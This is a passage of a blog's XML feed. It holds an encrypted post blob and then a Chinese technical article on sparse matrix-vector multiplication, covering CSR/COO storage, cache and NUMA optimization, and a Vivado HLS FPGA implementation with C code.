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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Magic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpMV</title>
      <link href="/2019/05/19/SpMV/"/>
      <url>/2019/05/19/SpMV/</url>
      
        <content type="html"><![CDATA[<h1 id="稀疏矩阵向量乘"><a href="#稀疏矩阵向量乘" class="headerlink" title="稀疏矩阵向量乘"></a>稀疏矩阵向量乘</h1><blockquote><p>本文参考: </p><p><a href="http://kns.cnki.net/KCMS/detail/detail.aspx?dbcode=CDFD&amp;dbname=CDFD1214&amp;filename=1011303506.nh&amp;uid=WEEvREcwSlJHSldRa1FhdkJkVG1BSEZmNDlLQ1Bla1NraUFEc2lQeFp5cz0=$9A4hF_YAuvQ5obgVAqNKPCYcEjKensW4IQMovwHtwkF4VYPoHbKxJw!!&amp;v=MzIwNTk4ZVgxTHV4WVM3RGgxVDNxVHJXTTFGckNVUkxPZll1ZHBGeUhuVTd2TlZGMjZIN0M0SGRUTXFaRWJQSVI=" target="_blank" rel="noopener">FPGA矩阵计算并行算法与结构(知网)</a></p><p><a href="https://xupsh.github.io/pp4fpgas-cn/06-Sparse-Matrix-Vector-Multiplication.html" target="_blank" rel="noopener">稀疏矩阵向量乘法xFPGA</a></p><p><a href="http://book.51cto.com/art/201506/480986.htm" target="_blank" rel="noopener">稀疏矩阵向量乘法x并行编程方法</a></p><p><a href="https://www.cnblogs.com/xbinworld/p/4273506.html" target="_blank" rel="noopener">稀疏矩阵存储格式总结</a></p><p><a href="https://mp.weixin.qq.com/s/ZrQd2avGTRsHMxj4wRA3gw" target="_blank" rel="noopener">深度学习FPGA加速器设计</a></p></blockquote><p>在矩阵中，若数值为0的元素数目远远多于非0元素的数目，并且非0元素分布没有规律时，则称该矩阵为稀疏矩阵；与之相反，若非0元素数目占大多数时，则称该矩阵为稠密矩阵。定义非零元素的总数比上矩阵所有元素的总数为矩阵的稠密度。<br>SpMV即 Sparse Matrix Vector Multiplication</p><h2 id="稀疏矩阵向量乘法的优化"><a href="#稀疏矩阵向量乘法的优化" class="headerlink" title="稀疏矩阵向量乘法的优化"></a>稀疏矩阵向量乘法的优化</h2><p>稀疏矩阵向量乘法（SPMV）可在很多情况下代替稠密矩阵运算，可以大量节省内存占用，减少计算开销。矩阵向量乘法不同于矩阵和矩阵的乘法，这是完全访存密集型的计算，我们主要的优化方向是提升访存效率或减少访存开销。</p><p>稀疏矩阵一般只存储非零元的信息，非零元的存储格式决定了访存的模式，这需要根据非零元的分布模式和要做的计算类型来设计。我们假设分布模式并非对角线分布，整体分布较均匀，局部可能会有聚集，计算类型是稀疏矩阵乘以稠密向量，结果为稠密向量。</p><p>标准的稀疏矩阵存储格式主要有：COO（Coordinate Format）和CSR（Compressed Sparse Row）等。COO很简单，就是使用3个数组，分别存储全部非零元的行下标（row index）、列下标（column index）和值（value）；CSR稍复杂，对行下标进行了压缩，假设矩阵行数是m，则压缩后的数组长度为m+1，记作（row ptr），其中第i个元素（0-base）表示矩阵前i行的非零元个数。</p><p>图1-1和图1-2展示了COO和CSR格式存储稀疏矩阵的一个例子。</p><p><a href="http://s8.51cto.com/wyfs02/M02/6E/B9/wKioL1WD-rnzJXs6AAAoveikjls134.jpg" target="_blank" rel="noopener"><img src="https://magic-king.net/images/loading.gif" data-original="http://s8.51cto.com/wyfs02/M02/6E/B9/wKioL1WD-rnzJXs6AAAoveikjls134.jpg" alt="img"></a></p><p>我们来考虑矩阵向量乘法计算y=Ax，其中A是稀疏矩阵，维度是m和n，非零元个数是k；x和y是稠密向量，维度分别是n和m，m×n &gt;&gt; k &gt;&gt; max(m, n)。做这个稀疏矩阵向量乘法就要遍历A的每一行，和x对应位置相乘，把结果累加到y的对应位置。这个过程对A的k个非零元全部访问了一遍，对x也访问了k个元素（重叠），对y访问了一遍，所以优化重点在于减少访问A的冗余，并提升访问x的效率。下面这几个优化标准稀疏矩阵存储格式的方法，可以提升访存效率，减少冗余。</p><p><a href="http://s2.51cto.com/wyfs02/M00/6E/B9/wKioL1WD-r7BqYmdAAB38WzGMbw735.jpg" target="_blank" rel="noopener"><img src="https://magic-king.net/images/loading.gif" data-original="http://s2.51cto.com/wyfs02/M00/6E/B9/wKioL1WD-r7BqYmdAAB38WzGMbw735.jpg" alt="img"></a></p><p>（1）对矩阵A做行列分块处理</p><p>对x的访问每次总是从左到右进行稀疏的遍历，如果n很大（比如上百万甚至更多），则访问x的空间局部性较差。所以我们首先改进矩阵A的访问顺序，将矩阵A分解成多个方形的子矩阵。子矩阵的维度适应较高层CPU硬件cache的大小，这样在遍历每一个子矩阵时，对x的访问相对集中于一个较小的区间，这个区间内的x会被cache缓存，这样能够大大提高访问效率。分块方式如图1-3所示。</p><p><a href="http://s2.51cto.com/wyfs02/M00/6E/BD/wKiom1WD-RLR2LssAABQf6mXvLM286.jpg" target="_blank" rel="noopener"><img src="https://magic-king.net/images/loading.gif" data-original="http://s2.51cto.com/wyfs02/M00/6E/BD/wKiom1WD-RLR2LssAABQf6mXvLM286.jpg" alt="img"></a></p><p>（2）自适应分块存储结构</p><p>由于稀疏矩阵的非零元分布不一定均匀，有的分块会非常稀疏，有的则会相对稠密。对于极稀疏的分块（非零元数量远小于行数），如果用和CSR相似的压缩行存储策略，则会浪费空间，所以用COO的方式反而更能节省存储空间，提高访问效率。</p><p>对于哪些分块使用CSR，哪些使用COO方式，可以通过实验的方式确定一个非零元的数量和分块大小的比值。高于该值的用CSR方式存储，否则用COO方式存储。</p><p>如图1-4所示，一共使用5个数组存储自适应分块信息的稀疏矩阵，灰色的部分是CSR的相关信息，白色的部分是COO的相关信息。col_idx和vals的意义不变；types存储分块类型，标识当前分块是CSR还是COO；如果当前分块是CSR，则row_info存储类似row_ptr的信息（第k个元素表示分块内第k行的非零元个数），否则存储COO的row_idx的信息；row_id存储每个分块在row_info上的起始地址。</p><p><a href="http://s5.51cto.com/wyfs02/M01/6E/B9/wKioL1WD-svwE_vyAABKDw_Pvok868.jpg" target="_blank" rel="noopener"><img src="https://magic-king.net/images/loading.gif" data-original="http://s5.51cto.com/wyfs02/M01/6E/B9/wKioL1WD-svwE_vyAABKDw_Pvok868.jpg" alt="img"></a></p><p>（3）减少下标存储的冗余</p><p>矩阵分块后，分块内间址的下标并不需要4字节int型整数存储，比如分块维度在64K以内，可以用2字节的unsigned short来存储。这样，无论是CSR或COO的row_idx、row_ptr，还是col_idx，都可以减少50%的存储空间，并同时提升访存效率。</p><p>（4）多线程和NUMA特性</p><p>单处理器多核多线程并行计算稀疏矩阵向量乘的过程比较简单，只需把矩阵划分成线程数量的子矩阵。这里采用横切的方法，计算结果不用合并。</p><p>但是对于多处理器非一致内存访问（NUMA），就需要对数据在内存中的分布做特殊处理，才能最大程度地利用全部的内存带宽。</p><p>一个典型的Intel X86双路服务器的拓扑架构如图1-5所示。</p><p>Memory #0是CPU #0的本地内存，Memory #1是CPU #1的本地内存，它们有各自独立的内存带宽。CPU #0访问Memory #1需要经过内部总线（在Intel的架构中叫QPI总线），这个总线的带宽一般小于内存带宽。另外如果要访问的数据只集中在一颗CPU的本地内存中，那么只能利用一个NUMA node的内存带宽，这就限制了系统的总体吞吐。</p><p>所以需要把稀疏矩阵的存储均匀地分配到两颗处理器各自的本地内存中。对于一个双CPU，每颗CPU一共4核的系统，需要开8个线程，并把这8个线程分别绑定到8颗CPU核上，使线程的上下文不会在核间迁移。对于每个线程要处理的稀疏矩阵数据，也通过系统调用（在Linux中是mbind），绑定到所在CPU核的本地内存中。这样每个核处理的数据一定是从本地内存中获得的，不会经过QPI总线。这就最大程度地利用了系统内存的带宽。经过实测，这个优化方法可以提升70%左右的内存带宽。</p><p><a href="http://s6.51cto.com/wyfs02/M02/6E/B9/wKioL1WD-uDTARvAAAB3790aG0s198.jpg" target="_blank" rel="noopener"><img src="https://magic-king.net/images/loading.gif" data-original="http://s6.51cto.com/wyfs02/M02/6E/B9/wKioL1WD-uDTARvAAAB3790aG0s198.jpg" alt="img"></a></p><p>对于我们测试的一个维度大约1M、稀疏度0.0001的稀疏矩阵来说，所有优化加起来，相对Intel MKL库中CSR矩阵的SpMV API加速了2.5x左右。学术界还有很多针对稀疏矩阵存储格式的讨论和研究，其中有些还利用了SIMD向量指令，这里介绍的稀疏矩阵乘法方法，更多是为了讨论内存和cache优化的一些基本原理。稀疏矩阵根据稀疏度和非零元分布的不同，需要使用不同的存储策略，所以遇到实际的稀疏矩阵问题，需要根据实际情况开发不同的存储格式。</p><h2 id="FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法"><a href="#FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法" class="headerlink" title="FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法"></a>FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法</h2><p>稀疏矩阵向量乘（<strong>SpMV</strong>）把一个稀疏矩阵与一个向量相乘。稀疏矩阵是指矩阵中大部分元素为0的矩阵。这里的向量本身也可是稀疏的，但通常情况下是密集的。作为一种通用的运算，在科学应用、经济模型、数据挖掘、信息检索中广泛应用。例如，在利用迭代法求解稀疏线性方程组和特征值的问题。同时，也被应用于网页搜索排名和计算机视觉（图像重构等）。</p><p>本章会引入几个与HLS相关的新概念，并进一步深入之前讨论过的优化。本章的目标之一是引入一种更复杂的数据结构。我们用压缩行存储（CRS）来保存稀疏矩阵。另一个目标是演示如何进行性能测试。我们编写了简单的激励用来检验设计是否正确。这在硬件设计中十分重要，<strong>Vivado®HLS</strong> 工具采用HLS C编写激励，并能轻松的对工具生成的RTL代码进行多方面的验证。这是基于HLS设计比基于RTL设计的巨大优势之一。章节中也会讲解如何采用Vivado®HLS工具进行C/RTL联合仿真。不同<strong>SpMV</strong>设计会带来性能上差异，因为执行时间和稀疏矩阵是密切相关的，所以我们必须通过输入数据来确定任务执行之间的间隔以及任务延迟。</p><h3 id="6-1-背景"><a href="#6-1-背景" class="headerlink" title="6.1 背景"></a>6.1 背景</h3><p>图6.1显示了一个4x4的矩阵M表示的2种方式。其中图6.1-a采用通用的二维方式16个元素来表示矩阵，每个元素存储在自己对应的位置上。图<strong>6.1</strong>-b采用<strong>CRS</strong>的方式表示相同的矩阵。<strong>CRS</strong> 作为一种数据结构，由3个数组组成。值(<strong>values</strong>)数组保存矩阵中非零元素的值。列索引(<strong>columnIndex</strong>)数组和行指针（<strong>rowPtr</strong>）数组对非零元素的位置信息进行编码。列索引存储每一列的元素，行指针包含每一行第一个元素的值。<strong>CRS</strong> 结构避免存储矩阵中的0值，确实在数值数组中确实没有存储0。但是在这个例子中，虽然数值数组不保存0，但是列索引数组和行指针数组作为标记信息，表示了矩阵的形态。<strong>CRS</strong> 广泛用于大型的矩阵但是仅仅有少量的非零元素（少于10%或者更低），这样可以简化这类矩阵的存储以及相关的运算。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://xupsh.github.io/pp4fpgas-cn/images/crs.jpg" alt="图 6.1: M是一个4x4矩阵，用两种方式表示：同&quot;密集&quot;矩阵一样存在二维数组之中；作为稀疏矩阵，以行压缩存储的形式保存，行压缩存储是一种由3个数组组成的数据结构。">图 6.1: M是一个4x4矩阵，用两种方式表示：同”密集”矩阵一样存在二维数组之中；作为稀疏矩阵，以行压缩存储的形式保存，行压缩存储是一种由3个数组组成的数据结构。</p><p>但是，CRS对矩阵的稀疏性没有要求，可以适用于任何矩阵。作为一种针对矩阵的通用方法，但不见得是最高效的。CRS结构也不见得是表示稀疏矩阵最高效的方式，其他稀疏矩阵表示方法也在被使用。</p><p>更准确的讲，CRS作为一种数据结构由3个数组构成：<strong>值</strong>(<strong>values</strong>)、<strong>列索引</strong>(<strong>colIndex</strong>)、<strong>行索引</strong>（<strong>rowPtr</strong>）。值数组和列索引表示稀疏矩阵<strong>M</strong>中的每一个非零元素，这些数组表示矩阵<strong>M</strong>采用行的方式，从左到右，从上到下。矩阵中的数据保存在值数组中，列索引数组保存数据在数组中水平方向的位置，如果 <strong>values[k]</strong> 表示 M_{ij}<em>M<strong>i</strong>j</em> 其中collndex[k]= j<em>c<strong>o</strong>l<strong>l</strong>n<strong>d</strong>e**x</em>[<em>k</em>]=<em>j</em>。数组<strong>rowPtr</strong>用n+1<em>n</em>+1的长度来表示n行矩阵。<strong>rowPtr[k]</strong> 表示在行k之前，矩阵中所有元素的数目，其中rowPtr[0]=0<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[0]=0且最后一个元素<strong>rowPtr[k]</strong> 总是表示当前矩阵k行之前所有非零元素的个数M_{ij}<em>M<strong>i</strong>j</em> ,其中rowPtr[i] \leq k \leq rowPtr[i+1]<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>]≤<em>k</em>≤<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>+1]。如果行k包含任何非0元素，那么<strong>rowPtr[k]</strong> 将包含当前行的第一个元素。注意，如果当前行没有非0元素，那么 <strong>rowPtr</strong> 数组中的值将会重复出现。</p><p>从图<strong>6.1</strong> a）中，我们可以行优先的方式遍历矩阵，从而确定值（<strong>values</strong>）数组在<strong>CRS</strong>中的形式。只要发现一个非0元素，它的值会被保存在下一个索引 i<em>i</em> 中，同时，它的列号<strong>columnIndex[i]</strong> 会被保存在列数组中。另外，在我们访问一个新行的时候，我们保存下一个值的索引 i<em>i</em> 在<strong>rowPtr</strong>数组中。所以，<strong>rowPtr</strong> 数组的第一个元素总是0。从图 6.1 b)中，我们可以把矩阵转换为二位数组表示的方式。第一步是根据<strong>rowPtr</strong>数组，确定每一行中非0 元素的个数。对行 i<em>i</em> 而言，该行中元素的数目为rowPtr[i]-rowPtr[i+1]<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>]−<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>+1]的差值。所以当前行的值可以从<strong>values</strong>数组<strong>values[rowPtr[i]]</strong> 开始，通过递归得到。在我们的示例矩阵中，因为前 <strong>rowPtr</strong> 数组前2个元素是0和2，所以我们知道第一行有2个非0元素，即<strong>value[0]</strong> 和<strong>value[1]</strong> 。第一个非0元素在<strong>values</strong>数组中,<strong>value[0]</strong> 是3。该值所对应的列号为1，因为columnIndex[0]=0<em>c<strong>o</strong>l<strong>u</strong>m<strong>n</strong>I<strong>n</strong>d<strong>e</strong>x</em>[0]=0。以此类推，矩阵中第二行元素的个数为k\in[2,4)<em>k</em>∈[2,4),第三行的元素个数为k \in [4,7)<em>k</em>∈[4,7)。最后，共有9个非0元素在矩阵中，所以<strong>rowPtr</strong>最后一个值是9。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"spmv.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spmv</span><span class="params">(<span class="keyword">int</span> rowPtr[NUM_ROWS+<span class="number">1</span>], <span class="keyword">int</span> columnIndex[NNZ],</span></span></span><br><span class="line"><span class="function"><span class="params">        DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])</span></span>&#123;</span><br><span class="line">L1: <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_ROWS; i++) &#123;</span><br><span class="line">        DTYPE y0 = <span class="number">0</span>;</span><br><span class="line">    L2: <span class="keyword">for</span> (<span class="keyword">int</span> k = rowPtr[i]; k &lt; rowPtr[i+<span class="number">1</span>]; k++) &#123;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">pragma</span> HLS unroll factor=8</span></span><br><span class="line">            <span class="meta">#<span class="meta-keyword">pragma</span> HLS pipeline</span></span><br><span class="line">            y0 += values[k] * x[columnIndex[k]];</span><br><span class="line">        &#125;</span><br><span class="line">        y[i] = y0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="https://xupsh.github.io/pp4fpgas-cn/images/placeholder.png" alt="图6.2: 主体代码演示了系数矩阵向量乘（SpMV）y=M.x的计算。采用CRS的方式，通过rowPt*、columnIndex 和 value 保存矩阵M。第一个for循环通过迭代访问每一行，第二个for循环访问每一列，实现矩阵M中非0元素和向量中对应的元素相乘并保存值在向量y中。">图6.2: 主体代码演示了系数矩阵向量乘（SpMV）y=M.x的计算。采用CRS的方式，通过rowPt*、columnIndex 和 value 保存矩阵M。第一个for循环通过迭代访问每一行，第二个for循环访问每一列，实现矩阵M中非0元素和向量中对应的元素相乘并保存值在向量y中。</p><p>给定一个二维数组表示一个矩阵，通过C代码实现矩阵CRS格式。编写对应的C代码实现将矩阵从CRS格式转化为二维数组的形式。</p><p>结果表明，通过采用<strong>CRS</strong>的方式，我们能高效的实现稀疏矩阵乘法，不需要将矩阵转化为二维形式。实际上， 对于大型的矩阵仅仅只有一小部分非0元素，稀疏矩阵向量乘法会比第四章中讨论的密集矩阵向量乘高效很多。因为我们直接找到非0元素，并执行非0元素对应的运算。</p><h3 id="6-2-基本实现"><a href="#6-2-基本实现" class="headerlink" title="6.2 基本实现"></a>6.2 基本实现</h3><p>图6.2 提供了基本代码对系数矩阵乘法的实现。函数<strong>spmv</strong>函数有5个参数，分别是<strong>rowPtr</strong>、<strong>columnIndex</strong> ，以及 <strong>values</strong> 对应矩阵 <strong>M</strong> 的 <strong>CRS</strong> 格式中包含的3个参数，这和图6.1中描述的数据结构等价。参数 y<em>y</em> 用于保存输出的结果，参数x表示输入的被乘向量x<em>x</em>。变量<strong>NUM_ROWS</strong>表示矩阵<strong>M</strong>中行号。变量<strong>NNZ</strong>表示矩阵中非0元素的个数。最后，变量SIZE表示数组x和数组y中元素的个数。</p><p>外层<strong>for</strong>循环标签为<strong>L1</strong>，对矩阵的行进行遍历。将矩阵当前的行与向量x相乘，得到输出的结果y<em>y</em>。内层循环标签为<strong>L2</strong>，实现对矩阵<strong>M</strong>中每列元素的遍历。L2循环迭代计算rowPtr[i+1]-rowPtr[i]<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>+1]−<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>]计算每一行非0元素的个数。每次循环计算，能从<strong>value</strong>数组中读取矩阵M的非0元素然后对应的从x数组中取得被乘向量x的值，对应相乘。<strong>cloumnIndex[k]</strong> 中的值保存了对应的列号<strong>k</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __SPMV_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __SPMV_H__</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> SIZE = <span class="number">4</span>; <span class="comment">// SIZE of square matrix</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> NNZ = <span class="number">9</span>; <span class="comment">//Number of non-zero elements</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> NUM_ROWS = <span class="number">4</span>;<span class="comment">// SIZE;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> DTYPE;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spmv</span><span class="params">(<span class="keyword">int</span> rowPtr[NUM_ROWS+<span class="number">1</span>], <span class="keyword">int</span> columnIndex[NNZ],</span></span></span><br><span class="line"><span class="function"><span class="params">          DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// __MATRIXMUL_H__ not defined</span></span></span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="https://xupsh.github.io/pp4fpgas-cn/images/placeholder.png" alt="图6.3： spmv函数和激励的头文件">图6.3： spmv函数和激励的头文件</p><h3 id="6-3-测试平台"><a href="#6-3-测试平台" class="headerlink" title="6.3 测试平台"></a>6.3 测试平台</h3><p>图6.4 展示了一个针对<strong>spmv</strong>函数测试平台。测试平台通过定义<strong>matrixvector</strong>函数，直接实现矩阵向量乘法，它不考虑矩阵是否为稀疏矩阵以及矩阵是否采用<strong>CRS</strong>方式表示。我们比较<strong>matrixvector</strong>函数输出和<strong>spmv</strong>函数的输出。</p><p>在通常的测试平台中，需要实现的函数都会有个“黄金”参考，作为用户期望综合的结果。测试平台会比较黄金用例的输出和通过<strong>Vivado®HLS</strong>综合的代码执行结果。最好的实践方式是，测试平台既可以用于黄金用例，也可用于被综合的代码。这样就保证了两者实现的正确性。</p><p>测试平台在主函数<strong>main</strong>中执行。这里我们通过设置<strong>fail</strong>变量初始化为0，当<strong>spmv</strong>函数的输出成结果与<strong>matrixvector</strong>函数输出结果不相同是时，变量置1。定义与矩阵<strong>M</strong>相关的变量、被乘向量x<em>x</em> 和输出结果y<em>y</em>。对于矩阵<strong>M</strong>，即有普通模式，也有<strong>CSR</strong>模式（保存为<strong>values</strong>、<strong>columnIndex</strong>、<strong>rowPtr</strong>）。矩阵<strong>M</strong> 的<strong>value</strong>如图6.1中所示，输出向量y<em>y</em>有两种，其中y_sw数组保存<strong>matrixvector</strong>函数输出的结果，y数组保存<strong>spmv</strong>函数输出的结果。</p><p>在定义好所有的输入变量和输出变量之后，分别调用<strong>spmv</strong>函数和<strong>matrixvector</strong>函数并输入合适的数据。 接下来的<strong>for</strong>循环用于比较y_sw和y中的每一个对应的结果。如果其中一个不相同，则将<strong>fail</strong> 标志置1。最后，程序会打印测试的结果并返回<strong>fail</strong>变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 